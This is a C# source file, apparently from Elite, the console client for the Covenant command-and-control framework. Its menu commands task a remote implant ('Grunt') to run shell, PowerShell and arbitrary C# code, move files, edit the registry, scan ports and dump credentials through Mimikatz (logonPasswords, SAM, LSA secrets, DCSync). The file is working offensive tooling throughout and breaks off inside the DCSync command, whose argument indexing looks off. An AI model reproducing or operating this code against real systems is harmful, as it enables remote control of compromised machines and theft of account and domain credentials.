// Author: Ryan Cobb (@cobbr_io)
// Project: Elite (https://github.com/cobbr/Elite)
// License: GNU GPLv3

using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;

using Covenant.API;
using Covenant.API.Models;

using Elite.Menu.Tasks;

namespace Elite.Menu.Grunts
{
    public class MenuCommandGruntInteractShow : MenuCommand
    {
        public MenuCommandGruntInteractShow(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.Name = "Show";
            this.Description = "Show details of the Grunt.";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            menuItem.Refresh();
            GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
            gruntInteractMenuItem.grunt = this.CovenantClient.ApiGruntsByIdGet(gruntInteractMenuItem.grunt.Id ?? default);
            Grunt grunt = gruntInteractMenuItem.grunt;
            EliteConsoleMenu menu = new EliteConsoleMenu(EliteConsoleMenu.EliteConsoleMenuType.Parameter, "Grunt: " + grunt.Name);
            menu.Rows.Add(new List<string> { "Name:", grunt.Name });
            menu.Rows.Add(new List<string> { "User:", grunt.UserDomainName + "\\" + grunt.UserName });
            menu.Rows.Add(new List<string> { "Integrity:", grunt.Integrity.ToString() });
            menu.Rows.Add(new List<string> { "Status:", grunt.Status.ToString() });
            menu.Rows.Add(new List<string> { "LastCheckIn:", grunt.LastCheckIn });
            menu.Rows.Add(new List<string> { "ComputerName:", grunt.IpAddress });
            menu.Rows.Add(new List<string> { "OperatingSystem:", grunt.OperatingSystem });
            menu.Rows.Add(new List<string> { "Process:", grunt.Process });
            menu.Rows.Add(new List<string> { "Delay:", grunt.Delay.ToString() });
            menu.Rows.Add(new List<string> { "Jitter:", grunt.Jitter.ToString() });
            menu.Rows.Add(new List<string> { "ConnectAttempts:", grunt.ConnectAttempts.ToString() });
            menu.Rows.Add(new List<string> { "Tasks Assigned:",
                String.Join(",", this.CovenantClient.ApiGruntsByIdTaskingsGet(grunt.Id ?? default).Select(T => T.Name))
            });
            menu.Rows.Add(new List<string> { "Tasks Completed:",
                String.Join(",", this.CovenantClient.ApiGruntsByIdTaskingsGet(grunt.Id ?? default)
                                    .Where(GT => GT.Status == GruntTaskingStatus.Completed)
                                    .Select(T => T.Name))
            });
            menu.Print();
        }
    }

    public class MenuCommandGruntInteractSet : MenuCommand
    {
        public MenuCommandGruntInteractSet(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.Name = "Set";
            this.Description = "Set a Grunt Variable.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "Option",
                    Values = new List<MenuCommandParameterValue> {
                        new MenuCommandParameterValue { Value = "Delay" },
                        new MenuCommandParameterValue { Value = "Jitter" },
                        new MenuCommandParameterValue { Value = "ConnectAttempts" }
                    }
                },
                new MenuCommandParameter { Name = "Value" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            menuItem.Refresh();
            Grunt grunt = ((GruntInteractMenuItem)menuItem).grunt;
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count != 3 || commands[0].ToLower() != "set")
            {
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else if (this.Parameters.FirstOrDefault(P => P.Name == "Option").Values.Select(V => V.Value.ToLower()).Contains(commands[1].ToLower()))
            {
                if (commands[1].ToLower() == "delay")
                {
                    int.TryParse(commands[2], out int n);
                    grunt.Delay = n;
                }
                else if (commands[1].ToLower() == "jitter")
                {
                    int.TryParse(commands[2], out int n);
                    grunt.Jitter = n;
                }
                else if (commands[1].ToLower() == "connectattempts")
                {
                    int.TryParse(commands[2], out int n);
                    grunt.ConnectAttempts = n;
                }
                this.CovenantClient.ApiGruntsPut(grunt);
            }
            else
            {
                menuItem.PrintInvalidOptionError(UserInput);
            }
        }
    }

    public class MenuCommandGruntInteractWhoAmI : MenuCommand
    {
        public MenuCommandGruntInteractWhoAmI()
        {
            this.Name = "whoami";
            this.Description = "Gets the username of the currently used/impersonated token.";
            this.Parameters = new List<MenuCommandParameter> { };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: whoami");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "WhoAmI" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractListDirectory : MenuCommand
    {
		public MenuCommandGruntInteractListDirectory()
        {
            this.Name = "ls";
			this.Description = "Get a listing of the current directory.";
            this.Parameters = new List<MenuCommandParameter> { };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1)
			{
                EliteConsole.PrintFormattedErrorLine("Usage: ls");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "ListDirectory" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

	public class MenuCommandGruntInteractChangeDirectory : MenuCommand
    {
		public MenuCommandGruntInteractChangeDirectory()
        {
            this.Name = "cd";
			this.Description = "Change the current directory.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Append Directory" },
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify Directory to change to.");
                EliteConsole.PrintFormattedErrorLine("Usage: cd <append_directory>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "ChangeDirectory" });
				task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set AppendDirectory " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

	public class MenuCommandGruntInteractProcessList : MenuCommand
    {
		public MenuCommandGruntInteractProcessList()
        {
            this.Name = "ps";
			this.Description = "Get a list of currently running processes.";
            this.Parameters = new List<MenuCommandParameter> { };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: ps");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "ProcessList" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractRegistryRead : MenuCommand
    {
        public MenuCommandGruntInteractRegistryRead()
        {
            this.Name = "RegistryRead";
            this.Description = "Reads a value stored in registry.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "RegPath",
                    Values = new List<MenuCommandParameterValue> {
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_USER\\" },
                        new MenuCommandParameterValue { Value = "HKEY_LOCAL_MACHINE\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CLASSES_ROOT\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_CONFIG\\" },
                    }
                }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: RegistryRead <regpath>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "RegistryRead" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set RegPath " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractRegistryWrite : MenuCommand
    {
        public MenuCommandGruntInteractRegistryWrite()
        {
            this.Name = "RegistryWrite";
            this.Description = "Writes a value into the registry.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "RegPath",
                    Values = new List<MenuCommandParameterValue> {
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_USER\\" },
                        new MenuCommandParameterValue { Value = "HKEY_LOCAL_MACHINE\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CLASSES_ROOT\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_CONFIG\\" },
                    }
                },
                new MenuCommandParameter { Name = "Value" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 3)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: RegistryWrite <regpath> <value>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "RegistryWrite" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set RegPath " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Value " + commands[2]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractUpload : MenuCommand
    {
		public MenuCommandGruntInteractUpload()
        {
            this.Name = "Upload";
            this.Description = "Upload a file.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "File Path",
                    Values = new MenuCommandParameterValuesFromFilePath(Common.EliteDataFolder)
                }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify FilePath of File to upload.");
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else if (commands.Count > 2)
            {
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Upload" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set FilePath " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

	public class MenuCommandGruntInteractDownload : MenuCommand
    {
		public MenuCommandGruntInteractDownload()
        {
            this.Name = "Download";
            this.Description = "Download a file.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "File Name" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify FileName to download.");
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else if (commands.Count > 2)
            {
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Download" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set FileName " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractAssembly : MenuCommand
    {
        public MenuCommandGruntInteractAssembly()
        {
            this.Name = "Assembly";
            this.Description = "Execute a .NET Assembly EntryPoint.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "Assembly Path",
                    Values = new MenuCommandParameterValuesFromFilePath(Common.EliteDataFolder)
                },
                new MenuCommandParameter { Name = "Parameters" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify AssemblyPath containing Assembly to execute.");
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Assembly" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set AssemblyPath " + commands[1]);
                if (commands.Count > 2)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Parameters " + String.Join(" ", commands.GetRange(2, commands.Count() - 2)));
                }
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractAssemblyReflect : MenuCommand
    {
        public MenuCommandGruntInteractAssemblyReflect()
        {
            this.Name = "AssemblyReflect";
            this.Description = "Execute a .NET Assembly method using reflection.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "Assembly Path",
                    Values = new MenuCommandParameterValuesFromFilePath(Common.EliteDataFolder) 
                },
                new MenuCommandParameter { Name = "Type Name" },
                new MenuCommandParameter { Name = "Method Name" },
                new MenuCommandParameter { Name = "Parameters" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify AssemblyPath containing Assembly to execute.");
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else if (commands.Count > 5)
            {
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "AssemblyReflect" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set AssemblyPath " + commands[1]);
                if (commands.Count > 2)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set TypeName " + commands[2]);
                }
                if (commands.Count > 3)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set MethodName " + commands[3]);
                }
                if (commands.Count > 4)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Parameters " + commands[4]);
                }
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractSharpShell : MenuCommand
    {
        private static string WrapperFunctionFormat = @"
using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Security;
using System.Security.Principal;
using System.Collections.Generic;

using SharpSploit.Credentials;
using SharpSploit.Enumeration;
using SharpSploit.Execution;
using SharpSploit.Generic;
using SharpSploit.Misc;

public static class Task
{{
    public static object Execute()
    {{
        {0}
    }}
}}
";

        public MenuCommandGruntInteractSharpShell()
        {
            this.Name = "SharpShell";
            this.Description = "Execute C# code.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "C# Code" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = UserInput.Split(" ").ToList();
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify C# code to run.");
                EliteConsole.PrintFormattedErrorLine("Usage: SharpShell <c#_code>");
            }
            else
            {
                string csharpcode = String.Join(" ", commands.GetRange(1, commands.Count() - 1));
                int gruntTaskId = (menuItem.CovenantClient.ApiGruntTasksGet().Select(GT => GT.Id).Max() ?? default(int)) + 1;
                GruntTask task = menuItem.CovenantClient.ApiGruntTasksByIdPost(gruntTaskId, new GruntTask
                {
                    Id = gruntTaskId,
                    Name = "SharpShell" + gruntTaskId,
                    Description = "Execute custom c# code from SharpShell.",
                    ReferenceAssemblies = String.Join(",", new List<string> { "System.DirectoryServices.dll", "System.IdentityModel.dll", "System.Management.dll", "System.Management.Automation.dll" }),
                    ReferenceSourceLibraries = String.Join(",", new List<string> { "SharpSploit" }),
                    EmbeddedResources = String.Join(",", new List<string>()),
                    Code = String.Format(WrapperFunctionFormat, csharpcode),
                    Options = new List<GruntTaskOption>()
                });

                Grunt grunt = ((GruntInteractMenuItem)menuItem).grunt;
                GruntTasking gruntTasking = new GruntTasking
                {
                    Id = 0,
                    Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
                    TaskId = task.Id,
                    GruntId = grunt.Id,
                    Status = GruntTaskingStatus.Uninitialized,
                    Type = GruntTaskingType.Assembly,
                    GruntTaskOutput = "",
                    SetType = GruntSetTaskingType.Delay,
                    Value = ""
                };
                GruntTasking postedGruntTasking = menuItem.CovenantClient.ApiGruntsByIdTaskingsPost(grunt.Id ?? default, gruntTasking);

                if (postedGruntTasking != null)
                {
                    EliteConsole.PrintFormattedHighlightLine("Started Task: " + task.Name + " on Grunt: " + grunt.Name + " as GruntTask: " + postedGruntTasking.Name);
                }
            }
        }
    }

    public class MenuCommandGruntInteractShell : MenuCommand
    {
        public MenuCommandGruntInteractShell()
        {
            this.Name = "Shell";
            this.Description = "Execute a Shell command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Shell Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = UserInput.Split(" ").ToList();
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a ShellCommand.");
                EliteConsole.PrintFormattedErrorLine("Usage: Shell <shell_command>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Shell" });
                string ShellCommandInput = String.Join(" ", commands.GetRange(1, commands.Count() - 1));
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ShellCommand " + ShellCommandInput);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractPowerShell : MenuCommand
    {
        public MenuCommandGruntInteractPowerShell()
        {
            this.Name = "PowerShell";
            this.Description = "Execute a PowerShell command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "PowerShell Code" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = UserInput.Split(" ").ToList();
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify PowerShellCode to run.");
                EliteConsole.PrintFormattedErrorLine("Usage: PowerShell <powershell_code>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "PowerShell" });
                string PowerShellCodeInput = "";
                if (gruntInteractMenuItem.PowerShellImport != "")
                {
                    PowerShellCodeInput = gruntInteractMenuItem.PowerShellImport;
                    if (!PowerShellCodeInput.Trim().EndsWith(";")) { PowerShellCodeInput = PowerShellCodeInput.Trim() + ";\r\n"; }
                }
                PowerShellCodeInput += String.Join(" ", commands.GetRange(1, commands.Count() - 1));
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set PowerShellCommand " + PowerShellCodeInput);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractPowerShellImport : MenuCommand
    {
        public MenuCommandGruntInteractPowerShellImport()
        {
            this.Name = "PowerShellImport";
            this.Description = "Import a local PowerShell file.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "File Path",
                    Values = new MenuCommandParameterValuesFromFilePath(Common.EliteDataFolder)
                }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify path to file to import.");
                EliteConsole.PrintFormattedErrorLine("Usage: PowerShellImport <file_path>");
            }
            else
            {
                string filename = commands[1];
                if (!File.Exists(filename))
                {
                    EliteConsole.PrintFormattedErrorLine("Local file path \"" + filename + "\" does not exist.");
                }
                else
                {
                    GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                    string read = File.ReadAllText(filename);
                    gruntInteractMenuItem.PowerShellImport += read;

                    TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                    task.ValidateMenuParameters(new string[] { "PowerShell" });
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set PowerShellCommand " + read);
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                    task.LeavingMenuItem();
                }
            }
        }
    }

    public class MenuCommandGruntInteractPortScan : MenuCommand
    {
        public MenuCommandGruntInteractPortScan()
        {
            this.Name = "PortScan";
            this.Description = "Conduct a TCP port scan of specified hosts and ports.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Computer Names" },
                new MenuCommandParameter { Name = "Ports" },
                new MenuCommandParameter { Name = "Ping" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 3 || commands.Count() > 4)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: PortScan <computer_names> <ports> [<ping>]");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "PortScan" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerNames " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Ports " + commands[2]);
                if (commands.Count() == 4)
                {
                    if (commands[3].ToLower() == "true" || commands[3].ToLower() == "false")
                    {
                        task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Ping " + commands[3]);
                    }
                    else
                    {
                        EliteConsole.PrintFormattedErrorLine("Ping must be either \"True\" or \"False\"");
                        EliteConsole.PrintFormattedErrorLine("Usage: PortScan <computer_names> <ports> [<ping>]");
                        return;
                    }
                }
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractMimikatz : MenuCommand
    {
		public MenuCommandGruntInteractMimikatz()
        {
            this.Name = "Mimikatz";
            this.Description = "Execute a Mimikatz command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a Mimikatz command.");
                EliteConsole.PrintFormattedErrorLine("Usage: Mimikatz <command>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Mimikatz" });
				task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

	public class MenuCommandGruntInteractLogonPasswords : MenuCommand
    {
		public MenuCommandGruntInteractLogonPasswords()
        {
            this.Name = "LogonPasswords";
			this.Description = "Execute the Mimikatz command \"sekurlsa::logonPasswords\".";
			this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: LogonPasswords");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Mimikatz" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command privilege::debug sekurlsa::logonPasswords");
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractSamDump : MenuCommand
    {
        public MenuCommandGruntInteractSamDump()
        {
            this.Name = "SamDump";
            this.Description = "Execute the Mimikatz command \"lsadump::sam\".";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: SamDump");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Mimikatz" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command lsadump::sam");
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractLsaSecrets : MenuCommand
    {
        public MenuCommandGruntInteractLsaSecrets()
        {
            this.Name = "LsaSecrets";
            this.Description = "Execute the Mimikatz command \"lsadump::secrets\".";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: LsaSecrets");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Mimikatz" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command lsadump::secrets");
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractDCSync : MenuCommand
    {
        public MenuCommandGruntInteractDCSync()
        {
            this.Name = "DCSync";
            this.Description = "Execute the Mimikatz command \"lsadump::dcsync\".";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "User" },
                new MenuCommandParameter { Name = "FQDN" },
                new MenuCommandParameter { Name = "DC" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2 || commands.Count() > 4)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: DCSync <user> [<fqdn>] [<dc>]");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Mimikatz" });

                string command = "\"lsadump::dcsync";
                if (commands[1].ToLower() == "all")
                {
                    command += " /all";
                }
                else
                {
                    command += " /user:" + commands[1];
                }
                if (commands.Count() > 2)
                {
                    command += " /domain:" + commands[3];
                }
                if (commands.Count() > 3)
                {
                    command += " /dc:" + commands[4];
                }
                command += "\"";
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + command);
